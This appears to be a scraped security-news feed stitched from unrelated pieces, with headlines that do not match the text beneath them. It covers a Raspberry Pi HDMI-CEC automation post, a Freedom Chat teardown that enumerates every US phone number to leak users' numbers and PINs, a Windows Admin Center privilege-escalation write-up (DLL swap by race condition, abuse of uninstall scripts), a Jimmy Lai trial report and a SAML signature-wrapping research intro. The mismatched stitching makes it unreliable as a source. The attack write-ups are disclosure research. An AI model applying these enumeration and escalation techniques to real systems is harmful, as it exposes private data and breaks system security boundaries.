CEC, the Apple TV handles it like a dream, but every console behaves like it missed the last week of CEC school. They wake the TV, switch the input, then leave the Denon asleep so I’m back to toggling audio outputs manually.I documented the media closet build-out separately, so if you want the full wiring tour (and the before/after photos), start there.With the media closet, rewiring everything to the TV wasn’t an option and disabling CEC wasn’t viable (Apple TV works and it gets the most use). My first instinct was to lean on traditional automation stacks: HomeKit scenes to chain “TV on” into “receiver on” or wattage triggers via an Eve Energy plug. This kind of worked, but every extra layer added 30 seconds of lag or more. The last stop on that journey was a homebridge-cec-tv-control plugin, but while reading the README I realized I was about to pipe CEC messages through Node, Homebridge, and HomeKit before they hit the receiver. The Pi is wired into the rack already, so skipping those layers and going through  directly was clearly the faster path.After an evening of struggling, the Pi now sits quietly on the HDMI bus, watching for consoles to announce themselves and issuing the single command Samsung + Denon should have exchanged on their own.This post follows the structure of my notes: build a small mental model of CEC, monitor the bus, copy whatever Apple TV does right, wrap it in Python, then ship it as a systemd unit., much better known as , is a low-bandwidth side channel that rides alongside HDMI video/audio. Everyone on the bus speaks in  ( for TV,  for audio systems,  for playback devices, etc.) and tiny  such as  () or  (). Physical addresses are “lat/long” references inside the topology, so  can mean “AVR input source HDMI 3”.CEC is  help consumers control their electronics, so in a healthy system the flow goes like this: console wakes and declares itself active, the TV notices there’s an ARC partner, somebody sends “please be the audio system”, the receiver wakes up, and audio comes out of the big speakers. For me, that path only occurred when Apple TV was involved. Sadly, when I woke a console, the TV switched inputs but audio stayed on the tinny TV speakers.To debug that mess I first wrote down how every device identified itself on the bus. Here are the specific CEC roles in my home theater:Audio system (Denon AVR-X1700H) – logical address  – logical addresses , ,  (Apple TV, PS5, Switch 2 and Xbox all competing for the three playback slots) – logical address  (messages to everyone)And the key opcodes we ended up caring about: –  (“I am now the active input”) –  (“this is where I live in the HDMI tree”) – System Audio Mode Request –  (Denon’s “I am now the audio system” broadcast)Monitoring the CEC bus with The Raspberry Pi 4 I have exposes  interface on its micro-HDMI, and with a $7 micro-HDMI to HDMI cable plugged into HDMI input port on the receiver, it’s possible to monitor CEC traffic from everything connected to the receiver.I was initially hesitant because of some Hue Play Sync Box trauma: every HDMI splitter or inline gadget I’ve tried in front of the TV caused weird EDID breakage, troubles with HDR negotiation, or outright signal loss. But once I understood the Pi  of the HDMI handshake my concerns went away. By plugging it into an unused HDMI input on the AVR, it behaves like just another participant on the shared CEC bus. No signal regeneration, no spoofed EDIDs, nothing for the rest of the chain to notice.So the topology looks like this:---

Now, you can get  from . Install it withThen do a quick scan to see which devices respond:Example scan output from my setup below. As you can see, the Xbox and Switch both claim logical address :If the expected devices show up, use monitor mode with the correct level of logging:This command keeps the Pi quiet (monitor mode) yet gives you every bus transaction.A line such as TRAFFIC: [...] >> bf:82:36:00 means: logical  (PS5) broadcast Active Source () with physical address . That’s the packet you expect any console to send when it wakes up.Figuring out the magic handshakeSo I put the system in standby, start logging, then wake Apple TV. I got the expected  burst, followed immediately by the Denon broadcasting that it has taken over audio:Apple TV announces itself as the active source.Apple TV broadcasts some magic bits?Very soon after, the Denon tells everyone “System Audio Mode is on,” and the TV happily keeps output set to  instead of flipping back to TV speakers.I did the exact same experiment with PS5, Xbox, Switch 2 and the result was different:So what was the  frame when Apple TV was involved? With debug logs,  showed . I suspect  labels it unknown because it’s in the vendor-specific range. The following bytes () could be Apple’s proprietary payload, like some capability or extended control. It’s possible Samsung and Apple have a private handshake here that ultimately results in the Denon doing the right thing. It’s neat, but I couldn’t rely on it since it’s undocumented and sending it manually from the Raspberry Pi’s logical address had no effect. Impersonating Apple TV over CEC is not realistically viable and likely brittle.However, with cec-o-matic.com, it was easy to craft a CEC frame for the Raspberry Pi to send a normal system audio mode request: = source  (Recorder 1 = Pi) sends to destination  (Audio System = Denon) = opcode System Audio Mode Request = operands (TV’s physical address 0.0.0.0, plus “system audio status” = off/0, which Denon interprets as “please negotiate system audio mode and turn on ARC”)The second I typed this into ’s interactive shell with , the Denon turned on and ARC anchored to the receiver even with only a console and TV powered on. I confirmed by checking the TV’s audio output:So the solution started to emerge: whenever a console wakes up and claims Active Source, the Pi should step in and send  to the Denon to kickstart audio negotiation.Now that we know the basis of the automation, the most obvious thing to do is to write a bash script that loops  every few seconds and blast . That sort of works, but it’s not ideal:Using a loop means the automation is delayed instead of reacting to actual CEC events.Every iteration spins up a new , binds to , sends one command, and tears down.CEC is a shared bus, not a write-only GPIO.Start a  long-lived  process.Let it print every  line for you to parse.Feed it  commands on stdin only when you need to intervene.The only catch: monitor mode () can’t transmit. So for the automation we switch to:No  here.  still prints all the traffic, but now it also accepts commands. Our Python script treats it like a bridge between HDMI land and our own logic:  is an event stream,  is a control channel.It took some trial and error, but it wasn’t too difficult to write a small Python program that watches for consoles waking up and sends the magic  command when needed. I put it all on GitHub:Starts  as a subprocess.Watches for  from any  logical address ().Tracks when the Denon last broadcast Set System Audio Mode () so we don’t fight Apple TV or the TV’s own logic.Sends  at most once per console wake if nobody else has done it.The script  any device names, vendors, or physical addresses.It treats any Playback logical address () turning into Active Source as a “console wake” event.It stays  when Apple TV / Samsung / Denon manage to do the right thing themselves (because we observe a real ).It runs as a single long-lived process tied to a single  instance.To make sure it starts on boot and keeps running, I wrapped it in a simple  service. The unit file I used can be found in the GitHub README. I’ve been running it for a few days and feels rock solid.Generalizing this approachI hope this post gives you enough of a mental model to adapt this approach to your own CEC pain points. My solution is specific to the Denon + Samsung + consoles scenario, but the same pattern should work for other CEC quirks.Maybe your issue isn’t consoles not engaging the AVR. Maybe DTS never negotiates, or your TV keeps snapping back to its tiny speakers. The workflow is the same:Get the Pi onto the an HDMI port. Plug the Pi into the TV or Receiver’s HDMI input using a micro-HDMI–>HDMI cable (or adapter). Put it somewhere it can sit forever.to make sure your Pi can see all the expected devices, what logical/physical addresses they have, and what roles they use.Record a “good” scenario and a “bad” one. Use:to log traffic while you:Trigger a  path (e.g., Apple TV gets 5.1 sound correctly).Trigger a  path (e.g., DTS falls back to stereo, or ARC drops to TV speakers).. Look for opcodes that show up in the good trace but are missing in the bad. In my case, the interesting delta was the presence of  after Apple TV woke, and the absence of anything like it when a console woke alone.Inject the missing opcode manually. Go to cec-o-matic.com to build the missing frame, then run:to use  in interactive mode, then type  for your suspected magic packet, and see if anything changes. If not, try again with a different frame.You likely would want to start with a frame like  (Pi logical address as Recording 1  to Broadcast ), or  (Pi to Audio System ), depending on what you’re trying to achieve.. Once you know the magic packet, wrap it in a tiny program like the one above and let the Pi quietly participate on the bus.You can picture the good vs bad paths like this:sequenceDiagram
  participant Src as Source (console/player)
  participant TV as TV (0)
  participant AVR as AVR / Soundbar (5)

  rect rgb(230,255,230)
    note over Src,AVR: Good path
    Src->>TV: Active Source (0x82)
    TV->>AVR: System Audio Mode Request (0x70)
    AVR->>TV: Set System Audio Mode On (0x72)
  end

  rect rgb(255,230,230)
    note over Src,AVR: Bad path
    Src->>TV: Active Source (0x82)
        note over TV,AVR: No audio-mode negotiation
  end
Your job is to spot the missing step and teach the Pi to do it.Where this leaves my setupApple TV keeps doing its thing. PS5, Xbox, or Switch now wake the TV, the Pi nudges the Denon within half a second, and audio stays glued to the receiver. Latency is low enough that it feels native. The Pi sits in the closet pretending to be a slightly overqualified remote.There are still a couple of rough edges I haven’t tackled yet:When a console goes to sleep, the TV sometimes “helpfully” switches to its antenna input. I don’t even have an antenna plugged in, so the net effect is a confusing “no signal” screen instead of falling back to Apple TV or a known-good input. That’s technically “correct” from the TV’s point of view (its own tuner is always a valid source), but wrong for how this setup is actually used.My sunset TV automation can land on a dead input. I have a HomeKit automation that turns the TV on around sunset. Most of the time that means Apple TV wakes up with a nice aerial screensaver. But if the last input before power-off was a console, the TV wakes to that HDMI port and just shows “no signal”, which confuses other people in the house.These problems are similar, but require slightly different solutions:Console standby → TV becomes Active Source. When a console goes to sleep it tends to release the bus and the TV politely promotes its tuner. The helper could watch for that very specific frame pair (console Standby, TV Active Source) and, after a short grace period, switch the input to Apple TV.Sunset automation → no Active Source. In this case the TV powers on but nobody (not even the TV) claims Active Source, so it sits on the last HDMI port showing “no signal.” The helper needs to detect “TV on, Denon asleep, no Active Source within N ms,” then wake both Apple TV and the receiver and switch inputs.Or maybe we could unify both by having a state machine that tracks “who was Active Source most recently” and automatically falls back to Apple TV whenever the bus goes quiet  the TV promotes itself. Either way, the Pi’s job is to make sure there’s always a sane outcome.That would turn the Pi into a more general “HDMI shepherd”: not just keeping ARC pinned to the receiver when something is playing, but also steering the system back to a sane default when nothing is.There’s probably a small cottage industry of “two-page CEC scripts” waiting to be written. If you adapt this trick for some other HDMI-CEC horror story, send me the packet traces—I’m collecting folklore.]]></content:encoded></item><item><title>PornHub extorted after hackers steal Premium member activity data</title><link>https://www.bleepingcomputer.com/news/security/pornhub-extorted-after-hackers-steal-premium-user-activity-data/</link><author></author><category>security</category><pubDate>Mon, 15 Dec 2025 21:27:07 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

This shouldn’t be too difficult.”Freedom Chat CEO Tanner HaasOnce upon a time, in the distant memory that is 2023, a new instant messaging app called Converso was launched. Converso made some pretty impressive claims about its security: it claimed to implement state of the art end-to-end encryption, to collect no metadata, and to use a decentralized architecture that involved no servers at all. Unfortunately, security researcher crnković did some basic reverse engineering and traffic analysis and found all of these claims to be completely baseless, with Converso collecting plenty of metadata on every message and using a third-party E2EE provider to store messages on bog standard centralized servers. Even more unfortunately, crnković also found that Converso implemented the (perfectly functional if used properly) Seald E2EE service in such a way that encrypted messages’ keys could be derived from publicly available information, and also uploaded a copy of every encrypted message to an open Firebase bucket, meaning every message ever sent on the service could be trivially read by anyone with an Internet connection. After being informed of the vulnerabilities, Converso initially released an update claiming to fix them, then withdrew from the App Store and Google Play to “address and improve the issues.”Not one to give up after a setback, Converso CEO Tanner Haas took a break from self-publishing books on how to achieve and receive anything you want to regroup and relaunch, as well as to bless the world with a lessons learned blog post describing his decision to rebrand after realizing that “privacy concerns were primarily coming from conservative circles,” and imparting nuggets of wisdom such as “accept criticism and get better: don’t complain” and “ensure the product has been thoroughly tested and is ready for prime-time.” Presumably he hadn’t learned the first one yet when he responded to crnković’s responsible disclosure with vague legal threats and accusations of being a Signal shill. Let’s see how the second is going.As usual, I start out by downloading the app from Google Play and running it while monitoring traffic with HTTP Toolkit. I quickly ran into Freedom Chat’s first security feature: as detailed on their website, the app “prevent[s] screenshots and screen recordings entirely with built-in screenshot protection,” perhaps to accomodate conservatives’ complicated relationship with screenshots. Screenshots aren’t really crucial to anything being discussed here, but I like to provide only the best blog posts to my tens of readers, so let’s hook the app with Frida and disable the FLAG_SECURE attribute. With that out of the way, the signup process works as expected for an instant messaging app - we type in a phone number, get texted a 2FA code, and enter it to create an account. We’re asked whether we want to create a PIN, which is apparently optional to log in on my own phone and required if we want to restore our account on another device, then get to the main UI of the app. There are two main features here: a Chat pane where we can start chats with contacts, and a Channels pane where we can subscribe to user-run microblogging channels à la Telegram.Let’s start out with the basics and have a conversation with a second account. Sending a text message triggers the following exchange:This is the encrypted and Base64-encoded text we sent, along with some metadata for things like read receipts and editing and the identifiers needed for decryption (they’re using the same Seald backend that Converso had, without uploading everything to Firebase this time). Sending a photo and a voice message yields similar results.
While verifying that they’re using Seald properly this time would require painstakingly decompiling and reverse engineering React Native’s Hermes VM bytecode, at a high level this seems fine. Let’s move on to the Channels feature. When we open the tab, we see that we’ve already been added to a Freedom Chat
channel, which mostly posts about updates to the app and related media coverage.We’re also suggested a handful of other channels to join, including that of Tanner Haas and some people who are apparently conservative influencers. Tanner mostly seems to use his to post fascinating political takes:When we open a channel, the following request and massive response happen:The  array has 1519 entries in that format, apparently one for each member of the channel. What’s going on in that  object? The  field seems suspiciously related to the PIN we were asked to input after creating our account… To confirm, we can sort the array by  and find that the most recent entry does indeed have the PIN we just set when making our account. So
anyone who’s in a channel (i.e. anyone who hasn’t left the default Freedom Chat channel) has their PIN broadcast to every other user! There’s no direct link between PINs and phone numbers here, but this is still not great.If we scroll back a bit in the Freedom Chat channel, we see this message dunking on WhatsApp:The vulnerability they’re talking about was presented in a paper by researchers at the University of Vienna. The paper is interesting and you should go read it, but to summarize, WhatsApp failed to rate limit the API that eats up every phone number in your contacts and checks whether
they also use WhatsApp or not. Researchers were thus able to test nearly every possible phone number in the world, and end up with a dump of every WhatsApp user’s phone number, along with some other metadata. It’s interesting that Freedom Chat isn’t vulnerable to this, because they have the same contact discovery feature WhatsApp does, with the app offering you to either start a chat
or invite each of your contacts depending on whether they already have an account:Let’s find out for ourselves. When we open this contacts page, the following request-response happens:The first two numbers in the request are the two we used to register Freedom Chat accounts. The third is a number we didn’t register, as a control. A couple things are interesting here. Most obviously, this is  the WhatsApp API the Vienna researchers exploited, and will contain the same vulnerability if not rate limited. This endpoint also provides a linkage
between phone numbers and UIDs - if we could run every registered phone number through it, we could get each number’s UID and match it to the UIDs in the Channels response to get that number’s PIN, entirely defeating the PIN mechanism. Now we just need to test whether it’s rate limitedThis is pretty self-explanatory. We generate every valid 7-digit North American phone number, then for every area code, send every number in batches of 40000, plus a number we registered so we can check for false empty responses. We log
responses that don’t contain the string “uid” exactly once; if a response contains it 0 times it has failed to produce our registered number and is thus faulty somehow, if a response contains it 2+ times we have found another number. We also
reauthenticate as needed and note if we start to slow down the server at all. Yes, there are a million ways to make this concurrent and faster, but we’re trying to enumerate not DDOS their server, and at ~1.5 seconds average RTT we should be able
to test every American phone number in about a day.The log file starts to fill up with entries within a few minutes:Starting area code 305

Time to go do something else for a while. Just over 27 hours and one ill-fated attempt at early season ski touring later, the script has finished happily, the logfile is full of entries, and no request has failed or taken longer than 3 seconds. So much for rate limiting. We’ve leaked
every Freedom Chat user’s phone number, and unless they happened to leave the default channel, we’ve also matched their phone number to their PIN, rendering the entire PIN feature pointless.: vulnerability discovered: Freedom Chat responds clarifying that PINs don’t allow restoring past messages, only logging into the account, and that they “had already been implementing additional audit procedures following the Vienna exploit,” promises fixes by next week: Freedom Chat notifies us issues have been patched: publication here and at TechCrunch]]></content:encoded></item><item><title>CVE-2025-65213 - MooreThreads torch_musa Deserialization Remote Code Execution</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65213</link><author></author><category>vulns</category><pubDate>Mon, 15 Dec 2025 19:16:05 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65213

The root cause lies in insecure directory permissions where the C:\ProgramData\WindowsAdminCenter folder is writable by all standard users. This affects all environments running WAC up to version 2411 and applies broadly across any organization using WAC for server or infrastructure management. The exposure impacts the technology layer rather than specific sectors. Any deployment that relies on the WAC gateway, integrated extensions, privileged administrative workflows or Windows Server hosts where WAC is installed inherits the risk. Standard users with access to the underlying filesystem can leverage this misconfiguration to escalate privileges. This misconfiguration allowed us to chain multiple techniques into working exploits: Extension Uninstall Mechanism Abuse – Hijacking the uninstall process to run signed PowerShell scripts with elevated privileges.  – Dropping a malicious DLL into the updater folder, which is then loaded automatically by a privileged WAC updater process. Both vectors enable escalation from a  to , effectively breaking the Windows security boundary. Microsoft confirmed the issue, assigned it CVE-2025-64669 and awarded us a $5,000 bounty. On Dec. 15, 2025, we updated Cymulate Exposure Validation with the new attack scenario WindowsAdminCenter - CVE-2025-64669 Local Privilege Escalation to test and validate threat detection in SIEM and endpoint security. Cymulate customers who wish to validate whether they are affected by this CVE can run the scenario against their Windows Admin Center gateway to assess exposure. Background: Windows Admin Center Windows Admin Center (WAC) is Microsoft’s web-based management tool for Windows Server and client machines. It provides a modern replacement for legacy MMC consoles and enables administrators to manage servers, clusters, hyper-converged infrastructure and Windows 10/11 endpoints from a browser. Windows Admin Center is a , heavily relied upon by IT administrators around the world to manage servers and endpoints at scale. Its popularity means that any vulnerability discovered in WAC has the potential for massive impact across enterprises of all sizes. From small businesses running a handful of servers, to global enterprises managing hybrid cloud environments, WAC is positioned as a central tool. The Cymulate Research Team knew that if we were able to find a serious security weakness in such a core piece of infrastructure, it wouldn’t just be a theoretical bug it would have real-world consequences for thousands of IT teams. This understanding motivated us to dive deep, focusing on how developers implemented sensitive actions like installation, updates and uninstallations.  Given the complexity and trust WAC commands in enterprise environments, our intuition was that even a single misstep in these areas could be leveraged to create a significant exploit opportunity. The Finding: Writable WAC Directory Our starting point was noticing that the folder C:\ProgramData\WindowsAdminCenter was writable by all users. At first glance this looked like a low-severity misconfiguration, because we didn’t initially realize that inside this folder there was also an executable running as a service under SYSTEM privileges. That completely changed the game. Suddenly this wasn’t just a writeable directory, it was a direct gateway into a highly privileged process.  We wanted to see if we could abuse that trust and after digging into how WAC manages updates and extensions, we confirmed several privileged processes load content straight from this folder. This opened two distinct exploitation paths: Extension Uninstall Mechanism Abuse Exploitation Path #1 – Extension Uninstall Mechanism Abuse We began by asking ourselves: “What kind of actions are guaranteed to run with elevated privileges but also touch user-accessible content?” Logic for Installation and uninstallation  are usually a goldmine in this regard. By design, these are  developers expect administrators to run, and if not properly secured they can be abused. So, we turned to dnSpy and decompiled the Windows Admin Center binaries being a .NET process (thanks Microsoft). This made reverse engineering far easier and more transparent for us. After exploring the namespaces, we quickly identified code responsible for uninstalling extensions.  The relevant section was crystal clear. It built a path to an uninstall folder, enumerated any .ps1 files there and executed them using PowerShell with the AllSigned execution policy. This code snippet shows exactly how WAC trusted whatever PowerShell scripts existed in the uninstall folder. Since the parent folder is writable by everyone, it opened a dangerous opportunity. That said, it isn’t completely trivial to just drop in a signed PowerShell payload you need to either find an existing signed script that can be abused, or craft and sign one yourself.  Signing your own script is of course a high-privileged activity, but we did this purely for demonstration purposes. While it is possible to locate various signed PowerShell scripts online that could be leveraged, for the sake of our demo we created and signed our own simple script. This script executed 'whoami' and dropped the output into C:\Users\Public, clearly showing the elevated execution context. We created a custom uninstall folder under. C:\ProgramData\WindowsAdminCenter\Extensions\<ExtensionName>. Placed a malicious signed script inside. Triggered the uninstall process via WAC’s UI/API. Our payload ran as  or even Exploitation Path #2 – Updater DLL Hijacking Next, we turned our focus to the updater mechanism. Updates are another , which usually means files are copied, verified, or loaded dynamically. Again, dnSpy was invaluable. We looked at the update component (WindowsAdminCenterUpdater.exe) and traced its DLL loading behavior. We found that the updater explicitly loaded DLLs from path C:\ProgramData\WindowsAdminCenter\Updater Since this folder was writable by all users, we immediately saw the classic attack surface – . We went to the decompiled code to understand exactly how updates were triggered and found an API endpoint: /api/update. At first, when we tested, our DLL was indeed loaded for a split second but did not execute. Checking the Event Viewer revealed that DLL was rejected because it was unsigned there was a validation step checking signatures. We almost gave up but then noticed something interesting. The validation process happens inside the WindowsAdminCenter process itself, and after it finishes, it calls and opens WindowsAdminCenterUpdater.exe. That gave us the idea to leverage a classic Time-of-Check Time-of-Use (TOCTOU). We wrote a simple PowerShell script that listens for WindowsAdminCenterUpdater.exe to start, then immediately copies our malicious user32.dll into the updater folder so it gets loaded without validation. This worked flawlessly. The DLL executed with SYSTEM privileges, and importantly, this script can be run completely as a regular user without any elevated permissions. This showed us that the updater trusted DLLs located in its working directory instead of enforcing system paths. Proof-of-Concept approach: We created a custom user32.dll that simply wrote to C:\Users\Public\test.txt for PoC purposes. Used a low-privileged account to monitor for updater activity via Register-WmiEvent. Dropped the DLL into C:\ProgramData\WindowsAdminCenter\Updater. Triggered an update using the /api/update endpoint. Our DLL executed as SYSTEM. Vulnerability reported to Microsoft via MSRC on Aug. 5, 2025. Microsoft acknowledged that there is a security issue on Aug. 29, 2025. Microsoft awarded us a $5,000 bounty on Sept. 3, 2025. On. Nov 12, 2025, Microsoft stated that a CVE would be assigned with Important severity, and a fix would be issued in the Dec. 10 Patch Tuesday. Validate Your Defenses Against Real Exploitation Start testing your Windows Admin Center instances against CVE-2025-64669 using the latest Cymulate attack scenario. ]]></content:encoded></item><item><title>700Credit data breach impacts 5.8 million vehicle dealership customers</title><link>https://www.bleepingcomputer.com/news/security/700credit-data-breach-impacts-58-million-vehicle-dealership-customers/</link><author>Bill Toulas</author><category>security</category><pubDate>Mon, 15 Dec 2025 16:49:03 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[700Credit, a U.S.-based financial services and fintech company, will start notifying more than 5.8 million people that their personal information has been exposed in a data breach incident.

He faces life in prison and is expected to be sentenced early next year.Lai used his now-defunct Apple Daily newspaper as part of a wider effortto lobby foreign governments to impose sanctions on Hong Kong and China, the court found.Hong Kong chief executive John Lee welcomed the verdict, noting that Lai's actions "damaged the country's interests and the welfare of Hong Kongers". Rights groups called it "a cruel judicial farce".They say the NSL, which Beijing defends as essential for the city's stability, has been used to crush dissent.Delivering the verdict on Monday,  Judge Esther Toh said there is "no doubt" that Jimmy Lai "harboured hatred" for the People's Republic of China (PRC), citing his "constant invitation to the US to help bring down the government of the PRC with the excuse of helping the people of Hong Kong".When Lai testified in November, he denied all the charges against him, saying he had "never" used his foreign contacts to influence foreign policy on Hong Kong.Asked about his meeting with then US Vice President Mike Pence, Lai said he did not ask anything of him: "I would just relay to him what happened in Hong Kong when he asked me."He was also asked about his meeting with then-secretary of state Mike Pompeo, to which he said he had asked Pompeo, "not to do something but to say something, to voice support for Hong Kong".Lai, one of the fiercest critics of the Chinese state, was a key figure in the pro-democracy protests that engulfed Hong Kong in 2019. Beijing responded to the months-long demonstrations, which sometimes erupted into violent clashes with police, by introducing the NSL. The law was enacted without consulting the Hong Kong legislature and gave authorities broad powers to charge and jail people they deemed a threat to the city's law and order, or the government's stability.    Lai was accused of violating the NSL for his role in the protests and also through his tabloid Apple Daily, which became a standard bearer for the pro-democracy movement.Monday's ruling also found Lai guilty of publishing seditious material on Apple Daily under a separate colonial-era law.Lai appeared calm as the verdict was read out and waved goodbye to his family as he was escorted out of the courtroom. Lai's wife Teresa and one of his sons were in court, along with Cardinal Joseph Zen, a long-time friend who baptised Lai in 1997."Mr Lai's spirit is okay," his lawyer Robert Pang said after the verdict. "The judgement is so long that we'll need some time to study it first. I don't have anything to add at the moment." He did not say whether they would appeal.Jimmy Lai's son Sebastien urged the UK government to "do more" to help free his father."It's time to put action behind words and make my father's release a precondition to closer relationships with China," he told a press conference in London. The UK condemned what it described as "politically motivated persecution" of Lai, saying he had been "targeted... for peacefully exercising his right to freedom of expression"."The UK has repeatedly called for the National Security Law to be repealed and for an end to the prosecution of all individuals charged under it," the Foreign, Commonwealth & Development Office said in a statement on Monday."The Chinese government abused Jimmy Lai with the aim of silencing all those who dare to criticise the CCP [Chinese Communist Party]," said Elaine Pearson, Asia director at Human Rights Watch, following the verdict."In the face of the farce of Jimmy Lai's case, governments should pressure the authorities to withdraw the case and release him immediately." Chinese foreign ministry spokesman Guo Jiakun responded to the criticism "by certain countries"."China expresses strong dissatisfaction and firm opposition to the brazen defamation and smearing of the judicial system in Hong Kong," he told reporters.Western governments, including the UK and US, have for years called for Lai's release, which Beijing and Hong Kong have rejected.US President Donald Trump had earlier vowed to "do everything to save" Lai, while UK PM Keir Starmer had said securing his release was a "priority". A test of judicial independenceLai's trial came to be widely seen as yet another test of judicial independence for Hong Kong's courts, which have been accused of toeing Beijing's line since 2019, when it tightened its control over the city. Hong Kong authorities insist the rule of law is intact but critics point to the hundreds of protesters and activists who have been jailed under the NSL - and its nearly 100% conviction rate as of May this year.Bail is also often denied in NSL cases and that was the case with Lai too, despite rights groups and Lai's children raising concerns about his deteriorating health. He has reportedly been held in solitary confinement. Sebastien Lai told the BBC earlier this year that his father's "body is breaking down" - "Given his age, given his health... he will die in prison."The Hong Kong government has also been criticised for barring foreign lawyers from working on NSL cases without prior permission. They said it was a national security risk, although foreign lawyers had operated in the city's courts for decades. Subsequently Lai was denied his choice of lawyer, who was based in the UK.Watch: Jimmy Lai's son speaks to the BBC about China-UK relationsLai now joins dozens of figures of the city's pro-democracy movement who have been sentenced to prison under the NSL.The chief of Hong Kong's national security police addressed the media after the verdict, saying Lai had "fabricated news" in pursuit of "political goals". On the mainland, state-run Global Times quoted a Hong Kong election committee member as saying that the case sends a "clear message": "Any attempt to split the country or undermine Hong Kong's prosperity and stability will be met with severe punishment under the law."Lai, who was born in mainland China, fled to Hong Kong when he was 12 years old and got his footing as a businessman after founding the international clothing brand Giordano. His journey as a democracy activist began after China brutally crushed pro-democracy protests in Beijing's Tiananmen Square in 1989.Lai started writing columns criticising the massacre and went on to launch a string of popular pro-democracy publications, including Apple Daily and Next.Even now, many Hong Kongers see him as a leading voice for democracy - about 80 people had queued to enter the court ahead of the verdict on Monday. One of them was Ms Lam who didn't want to share her full name. An apple in hand, she said she started queuing around 11:00 local time on Sunday – nearly a full day before the session – because dozens of people had come before her. It was a cold night, she said, but she did it because she had wanted to wish Lai good luck. "We all feel frustrated and powerless. Yet, there must be an ending to the whole issue and time comes when it comes," a former Apple Daily journalist, who was also in court, told the BBC."Jimmy always said that he was indebted to Hong Kong... but I think Hong Kong and most Hong Kongers are so grateful to have him upholding the core values, good faith and integrity for the community at the expense of his well being and personal freedom."In his testimony, Lai had said that he had "never allowed" his newspaper's staff to advocate for Hong Kong independence, which he described as a "conspiracy" and "too crazy to think about"."The core values of Apple Daily are actually the core values of the people of Hong Kong," he had said. These values, he added, include the "rule of law, freedom, pursuit of democracy, freedom of speech, freedom of religion, freedom of assembly".]]></content:encoded></item><item><title>GitHub Scanner for React2Shell (CVE-2025-55182) Turns Out to Be Malware</title><link>https://hackread.com/github-scanner-react2shell-cve-2025-55182-malware/</link><author></author><category>security</category><pubDate>Mon, 15 Dec 2025 16:34:57 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

These techniques allow an attacker to completely bypass XML Signature validation while still presenting a perfectly valid SAML document to the application.

Here’s a demo of the attack on a vulnerable GitLab EE 17.8.4 instance:Security Assertion Markup Language (SAML 2.0) is a complex authentication standard built on insecure and outdated XML technology. These legacy foundations have made the protocol notoriously difficult to maintain and have resulted in a persistent stream of critical vulnerabilities over the past two decades.This paper introduces several novel classes of Signature Wrapping (XSW) attacks capable of completely bypassing authentication in widely used open-source SAML libraries used across the internet.In addition, I present an open-source toolkit designed to identify and analyze discrepancies between XML parsers - enabling the discovery of authentication bypasses with very few requirements.The recent increase in SAML vulnerabilities shows that secure authentication cannot happen by accident. Keeping protocols like SAML safe requires coordinated, ongoing effort from the entire security community, not just quick fixes.The Service Provider-Initiated (SP-Initiated) SAML flow is the most common way users authenticate through SAML. It starts when a user tries to access a protected resource on the service provider’s website. Since the user is not yet authenticated, the service provider generates a SAML authentication request and redirects the user to the Identity Provider (IdP) for verification.The IdP receives this request, verifies its validity, and then issues a SAML Response containing a digitally signed Assertion that confirms the user’s identity. This response is sent back via the user’s browser to the service provider (SP). The SP then verifies the digital signature and extracts user information (such as username and email) from the Assertion. If the signature and data are valid, access is granted.The overall security of this flow depends entirely on how the SAML Response signature is validated. In many implementations, signature verification and assertion processing are handled by separate modules or even different XML parsers. An XML Signature Wrapping (XSW) attack exploits the discrepancies between these components.In a typical scenario, an attacker intercepts a legitimate SAML Response signed by a trusted Identity Provider and injects a new malicious Assertion containing arbitrary user information into the same document. When the Service Provider processes the response, the signature verification module correctly validates the legitimate portion of the message, while the SAML processing logic mistakenly consumes the attacker’s injected Assertion. As a result, the attacker’s forged data is treated as authentic, leading to a privilege escalation.Juraj Somorovsky, in his research "On Breaking SAML: Be Whoever You Want to Be" suggests that this could be done by registering through the IdP, performing a man-in-the-middle attack, or even digging through publicly exposed files using Google dorking. The problem is that this is a big requirement. Getting a valid signed SAML Assertion for an arbitrary website is extremely difficult. Identity Providers almost never expose them, and even if you somehow capture one, most Service Providers will accept it only once, after that it gets cached and rejected.So we take a different approach. Instead of trying to steal or reuse a signed Assertion, we simply reuse any other XML document signed with the IdP’s private key.With that legitimate signature in hand, we can then exploit the server's flawed signature-verification logic and make it believe that our malicious Assertion is the one that was signed, even though it wasn’t.In our previous research with Gareth Heyes - SAML roulette: the hacker always wins, we demonstrated how flaws in handling Document Type Declarations (DTDs) could be exploited to perform an XSW attack against the widely used Ruby-SAML library. To mitigate these issues, two security patches were released - versions 1.12.4 and 1.18.0.In this paper, I use the Ruby-SAML 1.12.4 patches as a case study to demonstrate why incremental fixes are insufficient and despite multiple attempts to address XML-related vulnerabilities, the underlying architecture remains fragile.Security patch 1.12.4 introduced two new checks to ensure that the SAML document does not contain DTDs and is a well-formed XML document. While this eliminated our original exploit, it did not address the root cause of the problem. The XML Security library still relied on two separate XML parsers - REXML and Nokogiri - for different parts of the validation process.According to the SAML specification, the Assertion element - or one of its ancestor elements - must be referenced by the Signature element, using an enveloped XML Signature.In the Ruby-SAML implementation, both REXML and Nokogiri locate the Signature element using the XPath query , which retrieves the first occurrence of a signature anywhere in the document. After that, additional logic, implemented in REXML, verifies that the parent element of the signature is an Assertion. This overly permissive XPath query became a key component of the exploit.An XML Signature is a two-pass signature mechanism: the hash value of the signed resource (DigestValue) and the URI reference to the signed element are stored inside a Reference element. The SignedInfo block that contains these references is then itself signed, and the resulting Base64-encoded signature is placed in the SignatureValue element. In the Ruby-SAML implementation, REXML is used to extract the DigestValue, which is then compared against the hashed element transformed with Nokogiri. The SignatureValue, also extracted by REXML, is expected to match the SignedInfo element as processed by Nokogiri, creating a fragile dependency between two different parsers with inconsistent XML handling.To craft a reliable exploit, it is important to first understand a fundamental feature of XML - namespaces. XML namespaces provide a mechanism for qualifying element and attribute names by associating them with Uniform Resource Identifiers (URIs).Namespace declarations are defined using a special family of reserved attributes. Such an attribute’s name must either be exactly xmlns (to declare a default namespace) or begin with the prefix  (to define a namespace with a specific prefix). For example:Both forms are valid and associate elements with the same SAML 2.0 Protocol namespace.Namespaces are ideal for Signature Wrapping attacks, as they directly influence how XML elements are identified by XPath queries. Most SAML libraries rely on libxml2 